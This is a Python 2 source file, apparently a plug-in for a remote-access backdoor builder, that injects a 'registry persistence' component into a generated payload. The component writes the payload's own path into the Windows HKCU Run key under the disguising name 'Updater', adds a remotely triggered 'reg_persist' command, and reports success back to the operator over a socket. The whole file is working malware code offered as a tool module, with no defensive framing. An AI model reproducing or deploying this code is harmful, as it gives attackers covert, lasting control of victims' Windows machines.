# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import _winreg')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from os import getcwd')
        config.import_statements.append('from os import path')
        config.functions.append('''
def registry_persist(path):
    try:
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, _winreg.KEY_READ)
        value, regtype = _winreg.QueryValueEx(registry_key, 'Updater')
        _winreg.CloseKey(registry_key)
        if value.encode() == path:
            s.sendall('[-]Registry persistence already achieved')
        else:
            raise SyntaxError
    except:
        reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
        key = _winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,_winreg.KEY_WRITE)
        _winreg.SetValueEx(key, 'Updater',0,_winreg.REG_SZ, path)
        _winreg.FlushKey(key)
        _winreg.CloseKey(key)
        _winreg.CloseKey(reg)
        s.sendall('[+]Persistence achieved')''')
        config.logics.append('''
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),argv[0]))''')
    elif option == 'info':
        print '\nName             : Registry Persistence component' \
              '\nOS               : Windows' \
              '\nRequired Modules : _winreg, sys, os' \
              '\nCommands         : reg_persist' \
              '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry folder'
